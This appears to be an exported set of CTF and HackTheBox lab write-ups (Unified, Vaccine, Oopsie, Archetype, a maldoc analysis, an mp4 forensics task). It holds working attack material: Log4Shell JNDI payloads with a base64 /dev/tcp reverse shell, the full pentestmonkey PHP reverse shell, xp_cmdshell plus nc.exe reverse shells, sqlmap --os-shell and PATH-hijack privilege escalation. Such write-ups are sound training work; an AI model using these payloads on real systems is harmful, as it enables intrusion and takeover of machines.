3/15/2018 12:38 AM mr3ks d-r--- 11/21/2016 3:24 AM Public *Evil-WinRM* PS C:\\Temp\u0026gt; type \\\\DC.intranet.poo\\c$\\users\\mr3ks\\desktop\\flag.txt POO{[REDACTED]} ","date":"7 October 2024","externalUrl":null,"permalink":"/posts/p.o.o/","section":"Posts","summary":"Professional Offensive Operations","title":"P.O.O","type":"posts"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/categories/ctfroom/","section":"Categories","summary":"","title":"CTFROOM","type":"categories"},{"content":"","date":"30 September 2024","externalUrl":null,"permalink":"/categories/forensics/","section":"Categories","summary":"","title":"Forensics","type":"categories"},{"content":" Introduction # In this challenge, we are given an mp4 file that seems to be corrupted. We shall try to rectify the hex data in order to get the file. Below is the description of the challenge description.\nTask 1 # in order to get the first flag we had to get the correct file headers in order for the file content to be accessible. As seen below, the correct header for the file should look as seen below.\nsource: https://www.file-recovery.com/mp4-signature-format.htm\nand here is our files header.\nthe header bytes are off, we shall rectify it referring to our source image as shown earlier. However, for one to be able to view the file’s hex data, we can use a tool such as hexeditor.\nhexeditor \u0026lt;file\u0026gt; I tried to edit the header but still got nothing, it seems am editing the wrong file header. Looking at the file specification, after a long resesarch and analysis, I came to find out that the duration bit of the file was off where by I had to change the lmvh. to lmvhd as shown below.\nsource: https://www.cimarronsystems.com/wp-content/uploads/2017/04/Elements-of-the-H.264-VideoAAC-Audio-MP4-Movie-v2_0.pdf\nto make it easier for one to edit the file, one could use an online hexeditor and still get the same file. After editing, we got our file with the first flag as shown below.\nBSidesNBI{W3ll_fr33_fl4g_All_My_L0v3} but the song is weird it is played in reverse, therefore, we are required to play it backwards to get our second flag.\nTask 2 # I used this tool to get the second flag, under the audio tools, I chose reverse audio to get the message clearly\n{hanah_your_music_prodigy} ","date":"30 September 2024","externalUrl":null,"permalink":"/posts/the-musician/","section":"Posts","summary":"Some hex headers to rectify","title":"The Musician","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/ir/","section":"Tags","summary":"","title":"IR","type":"tags"},{"content":" Introduction # In this challenge, we are given a malicious document for us to analyze, here is the description of the challenge.\nAfter downloading the zipped folder in our controlled environment, we are required to unzip it using the password given to us.\nWe are given a file called maldoc.xlsx, however using the file to answer our questions we got wrong answers. I decided to look if there were any embed files on to the document using binwalk, and it seems to be some files embed on to it as shown below.\nyeap, there are some files embed on to our document, lets extract them using the same tool.\nTask 1 # we are required to know when the file was last modified,we are required to check the actual file before extracting the embedded files for analysis, maldoc.xlsx.\nlooking at the metadata of the file, we are bale to get the modification date of the file as shown below, we have two modification dates, hence we shall consider the latest time that was modified which is\nFile Modification Date/Time : 2023:09:26 15:34:36+03:00 answer: 2023:09:26 15:34:36\nTask 2 # this one was easy, we just had to use the command md5sum on the file to get the hash as shown below.\n──(n00b㉿v1c70r)-[~/…/Maldoc/_maldoc.xlsx.extracted/xl/embeddings] └─$ md5sum vKlT.JyZ 8244dd7fe06510832017d869ca1e6796 vKlT.JyZ answer: 8244dd7fe06510832017d869ca1e6796\nTask 3 # for this challenge, after getting our hash, I uploaded the hash on virustotal and the cve was given to us as shown below.\nanswer: CVE-2017-11882\nTask 4 # after uploading the hash on virustotal, I went under behavior and saw a certain url as shown below.\nanswer : ”http://81.161.229.226/naun.vbs”\n","date":"26 September 2024","externalUrl":null,"permalink":"/posts/maldoc/","section":"Posts","summary":"Credit CTFROOM","title":"Maldoc","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/malware-anlaysis/","section":"Tags","summary":"","title":"Malware Anlaysis","type":"tags"},{"content":"","date":"25 September 2024","externalUrl":null,"permalink":"/categories/starting-point/","section":"Categories","summary":"","title":"Starting Point","type":"categories"},{"content":"","date":"25 September 2024","externalUrl":null,"permalink":"/categories/tier2/","section":"Categories","summary":"","title":"Tier2","type":"categories"},{"content":" INtroduction # Task 1 # Which are the first four open ports?`\n┌──(n00b㉿v1c70r)-[~/starting point] └─$ nmap -sCV -A 10.129.211.32 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 07:03 EAT Nmap scan report for 10.129.211.32 Host is up (0.25s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy |_http-title: Did not follow redirect to https://10.129.211.32:8443/manage |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Thu, 26 Sep 2024 04:05:01 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 | Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 404 | Found\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | GetRequest, HTTPOptions: | HTTP/1.1 302 | Location: http://localhost:8080/manage | Content-Length: 0 | Date: Thu, 26 Sep 2024 04:05:00 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Thu, 26 Sep 2024 04:05:01 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 | Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Thu, 26 Sep 2024 04:05:02 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 8443/tcp open ssl/nagios-nsca Nagios NSCA | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US | Subject Alternative Name: DNS:UniFi | Not valid before: 2021-12-30T21:37:24 |_Not valid after: 2024-04-03T21:37:24 | http-title: UniFi Network |_Requested resource was /manage/account/login?redirect=%2Fmanage 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94SVN%I=7%D=9/26%Time=66F4DD6C%P=x86_64-pc-linux-gnu%r SF:(GetRequest,84,\u0026#34;HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8 SF:080/manage\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x20202 SF:4\\x2004:05:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,84 SF:,\u0026#34;HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080/manage\\r\\n SF:Content-Length:\\x200\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x202024\\x2004:05:00\\ SF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x SF:20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Langua SF:ge:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x2020 SF:24\\x2004:05:01\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt; SF:\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93 SF:\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-fam SF:ily:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white SF:;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-s SF:ize:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x2 SF:0{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;borde SF:r:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\ SF:x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(FourOhFourRequest,24A,\u0026#34;HTTP/1\\ SF:.1\\x20404\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-La SF:nguage:\\x20en\\r\\nContent-Length:\\x20431\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x SF:202024\\x2004:05:01\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20h SF:tml\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80 SF:\\x93\\x20Not\\x20Found\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-f SF:amily:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:whi SF:te;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font SF:-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\ SF:x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;bor SF:der:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x9 SF:3\\x20Not\\x20Found\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(Socks5,24E,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20 SF:en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x202024\\x200 SF:4:05:02\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x SF:20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad SF:\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tah SF:oma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;backgr SF:ound-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16p SF:x;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color SF::black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:none; SF:}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\ SF:x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 244.18 seconds 22,6789,8080,8443\nTask 2 # What is the title of the software that is running running on port 8443?\nUniFi Network\nTask 3 # What is the version of the software that is running?\n6.4.54\nTask 4 # What is the CVE for the identified vulnerability?\nSearch for “Unify 6.5.4 CV” and will have some sites that talk about : CVE-2021–44228. I found this article : https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi very interesting. CVE-2021–44228\nTask 5 # What protocol does JNDI leverage in the injection?\nTask 6 # What tool do we use to intercept the traffic, indicating the attack was successful?\ntcpdump\nTask 7 # What port do we need to inspect intercepted traffic for?\nThe protocol use for injection is LDAP, so the port to inspect is the default port of LDAP which is 389. Task 8 # What port is the MongoDB service running on?\nThe mongoDB service is an internal process. We first try to take the control of the machine by exploiting the CVE : CVE-2021–44228.\nFirst step is to download a tool that will help us to exploit the previous vulnerabilities.\nwget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar Once the tool is download, use the following code to open an LDAP server on your attack box. Note that you have to change the IP address by yours\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;nc IP_ADDRESS PORT -e /bin/sh\u0026#34; -A \u0026#34;IP_ADDRESS\u0026#34; The output will be similar to this\nThe second step is to open a netcat listener in our attack box. 4444 here is my chosen port.\nnc -lvp 4444 The third step is to intercept a login request with burpsuite and tamper with it, By adding our payload. Replace the URL with the one which is return in the previous step\nWhen we send out request we got an error\nBefore we continue it is important to know if the error it is not because the application is not vulnerable. To verify that, we will use tcpdump to intercept traffic and verify if there is an initiated connection when the previous request is sent.\nStart tcpdump with this command\nsudo tcpdump -i tun0 port 1389 Then re-send the request, and you will have output like this. Mean that application is vulnerable to jndi injection, but we have to build a better payload.\nTo build our payload, we will need maven and open-jdk, in my computer it is installed by default if it is not the case for you, install it.\nClone and build the project with this command line\ngit clone https://github.com/veracode-research/rogue-jndi \u0026amp;\u0026amp; cd rogue-jndi \u0026amp;\u0026amp; mvn package Then, encode to base64 the command we want to inject. Change the IP_ADDRESS by your attack box and PORT by the port you want (it has to be free).\necho \u0026#39;bash -c bash -i \u0026gt;\u0026amp;/dev/tcp/IP_ADDRESS/PORT 0\u0026gt;\u0026amp;1\u0026#39; | base64 Copy the output, it will help in the following\nAfter this, we launch an LDAP server on our attack box. Change the IP_ADDRESS by yours and the base64 code by the previous output\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \u0026#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjM0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}\u0026#34; --hostname \u0026#34;IP_ADDRESS\u0026#34; We have now to open a listener on a port, we previously choose\nThen, we intercept a login request with burpsuite and add our payload\nSend the request and back to your listener, you are now connected to the victim machine\nOnce connected, we can upgrade the shell to be more interactive\nscript /dev/null -c bash We use the ps -aux command to know processes running\n!\nAnd there is mongodb at the port 27117\nTask 9 # What is the default database name for UniFi applications?\nConnect to mongo db and list databases\nmongo --port 27117 show dbs Task 10 # What is the function we use to enumerate users within the database in MongoDB?\ndb.admin.find() Task 11 # What is the function we use to update users within the database in MongoDB?\ndb.admin.update() Task 12 # What is the password for the root user?\nUse this command to dump all the passwords in the database :\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; \u0026lt;17 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; MongoDB shell version v3.6.3 connecting to: mongodb://127.0.0.1:27117/ace MongoDB server version: 3.6.3 { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;), \u0026#34;name\u0026#34; : \u0026#34;administrator\u0026#34;, \u0026#34;email\u0026#34; : \u0026#34;administrator@unified.htb\u0026#34;, \u0026#34;x_shadow\u0026#34; : \u0026#34;$6$nCiz.BUHQGQ8KpZv$pRaZabdm03bPBxVyaG6OKs/dmMASG6DxTC30/IceWjGVeXtBbYshFjuAGOJOJcEQhE4.4x0ETwCS/92wsa7W51\u0026#34;, There is an administrator user, in the x_shadow file it is an SHA-512 hash of the password, you can try to crack it but it nos possible. So we will update the admin user and change it password by a chose one.\nWe generate the hash of new password\nmkpasswd -m sha-512 Password We update the administrator user and add the password of our custom hash with the follow command\nmongo --port 27117 ace --eval \u0026#39;db.admin.update({\u0026#34;_id\u0026#34;: ObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;)},{$set:{\u0026#34;x_shadow\u0026#34;:\u0026#34;HASH GENERATES\u0026#34;}})\u0026#39; We verify is the update was done\nmongo --port 27117 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; And try to connect with username and our custom password\nThe manage console is now open\nJust open the site tab on the settings menu and the password is store in clear text.\nOnce connected, we can get the user flag at the /home/michael folder\nRoot flag is in the /root folder\n","date":"25 September 2024","externalUrl":null,"permalink":"/posts/unified/","section":"Posts","summary":"Unity is key","title":"Unified","type":"posts"},{"content":" Introduction # Task 1 # Besides SSH and HTTP, what other service is hosted on this box?\nFTP\nTask 2 # This service can be configured to allow login with any password for specific username. What is that username?\nanonymous\nTask 3 # What is the name of the file downloaded over this service?\nbackup.zip\nTask 4 # What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?\nAs seen above we have been able to find the password for the zipped folder, now we can be able to unlock the folder in order to find the contents of the folder\nzip2john Task 5 # What is the password for the admin user on the website?\nqwerty789\nTask 6 # What option can be passed to sqlmap to try to get command execution via the sql injection?\n—os-shell\nwe shall try to get a shell from the machine using sqlmap to get our foothold into the machine as shown below\nsqlmap -url=\u0026#34;http://[IP]/dashboard.php?search=new\u0026#34; -cookie=\u0026#34;PHPSESSID=snduj64lg29ger6doubiqid824\u0026#34; --os-shell and we have our foothold into the machine.\nTask 7 # What program can the postgres user run as root using sudo?\nFor this section we had to run the following command\nsudo -l but we are required to input password for the postgres user in order to get the output, hence I dug around and found the password in the file below.\n/var/www/html/dashboard.php password=P@s5w0rd! Since now we have our password for the postgres user, we can login through ssh\nvi\nnow we can look at gtfobins on how we can exploit vi to get a root shell\nafter logging in, we were able to get our user flag.\nnow to root the machine and pawn it, we had to exploit vi using this procedure form gtfobins.\nvi :set shell=/bin/sh :shell and we have pawned our machine.\n","date":"25 September 2024","externalUrl":null,"permalink":"/posts/vaccine/","section":"Posts","summary":"Some medicine for you.","title":"Vaccine","type":"posts"},{"content":"","date":"25 September 2024","externalUrl":null,"permalink":"/tags/very-easy/","section":"Tags","summary":"","title":"Very Easy","type":"tags"},{"content":" Introduction # Task 1 # With what kind of tool can intercept web traffic?\nproxy Task 2 # What is the path to the directory on the webserver that returns a login page?\n/cdn-cgi/login\nTask 3 # What can be modified in Firefox to get access to the upload page?\ncookie\nTask 4 # What is the access ID of the admin user?\nFirst things, after logging in as guest, we had to access the account section and the url changes as seen below.\nthe parameter can be exploited as it is vulnerable to IDOR, where one can change the value quite easily, hence, I decided to intercept the traffic with burpsuite and bruteforce the id parameter in order to get the admin parameter\nthe payload I used was from 0 to 10, the admin ID was 1.\n34322\nTask 5 # On uploading a file, what directory does that file appear in on the server?\nuploads\nAs we can see, we can use a file upload to get a reverse shell into our machine, we shall use the PHP-reverse shell from pentest-monkey\n\u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;127.0.0.1\u0026#39;; // CHANGE THIS $port = 1234; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } // If we can read from the process\u0026#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; above is the code we shall use but first we are required to change the IP and port variable to our machine IP and the port we shall be listening on. and we have our shell\nfor us to get our reverse shell, we had to go to the address http://[ip]/uploads/shell.php\nTask 6 # What is the file that contains the password that is shared with the robert user?\ndb.php\nTask 7 # What executible is run with the option \u0026ldquo;-group bugtracker\u0026rdquo; to identify all files owned by the bugtracker group?\nTask 8 # Regardless of which user starts running the bugtracker executable, what\u0026rsquo;s user privileges will use to run?\nroot\nTask 9 # What SUID stands for?\nSet owner User ID\nTask 10 # What is the name of the executable being called in an insecure manner?\ncat\nbelow is the user flag.\nfor us to escalate our privileges, we shall need to exploit the wrongly called binary cat as shown below.\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; cat chmod +x cat export PATH=/tmp:$PATH ./bugtracker or we could just exploit the bugtracker to open our root.txt file as shown below.\nand we have pawned our machine.\n","date":"24 September 2024","externalUrl":null,"permalink":"/posts/oopsie/","section":"Posts","summary":"OOpsiez","title":"Oopsie","type":"posts"},{"content":" Introduction # Task 1 # Which TCP port is hosting a database server?\n1433\nTask 2 # What is the name of the non-Administrative share available over SMB?\nbackups\nTask 3 # What is the password identified in the file on the SMB share?\nM3g4c0rp123\nTask 4 # What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?\nmssqlclient.py\nTask 5 # What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?\nxp_cmdshell\nafter we log in through impacket, we are required to stabilize our shell using the command above as shown below.\nLet us try to gain RCE on this box. Follow these commands in order.\nFollow these steps :\nEXECUTE sp_configure \u0026#39;show advanced options\u0026#39;,1; RECONFIGURE; EXECUTE sp_configure \u0026#39;xp_cmdshell\u0026#39;,1; RECONFIGURE; Now try running :\nxp_cmdshell \u0026#34;whoami\u0026#34; Now it’s working and this command will return us “archetype/sql_svc”.\n(Stable shell):\nOur shell is working but we won’t be executing our commands like this again so we will get a stable shell. Now let’s search and find something.\nAfter some searching we found an article:\nhttps://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/\nWe will follow the last method: xp_cmdshell with nc\nHere first we have to download nc.exe on our local system, which can be downloaded from the link: https://github.com/int0x33/nc.exe/blob/master/nc.exe After downloading let’s set up a python server on our machine in order to send the file to the target system. python3 -m http.server// Keep in mind to run the server in the folder yout nc.exe file is present We will use the following command to get the file on our target system: xp_cmdshell \u0026#34;powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\\\Users\\Public\\\\nc.exe\u0026#34;/* we don\u0026#39;t need the rest of the command because : . we already are connected to sql . we already logged in using correct credentials */ If our file is successfully transferred we will get something like this in our server instance root@ip-10-10-204-169:~# python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.129.102.63 - - [22/Feb/2022 09:12:04] \u0026#34;GET /nc.exe HTTP/1.1\u0026#34; 200 - The next step is to execute the file in our target system for the reverse shell. So for that first, let’s set up our Netcat listener on our system: nc -lvnp 4444 We will execute the following command in our target system xp_cmdshell \u0026#34;c:\\\\Users\\Public\\\\nc.exe -e cmd.exe [Your_tun0_IP] 4444\u0026#34; So we got our stable shell so our next step is to find the flags. So user flag is in the Dekstop folder and we can navigate to that folder :\ncd \\ cd Users cd sql_svc cd Desktop type user.txt 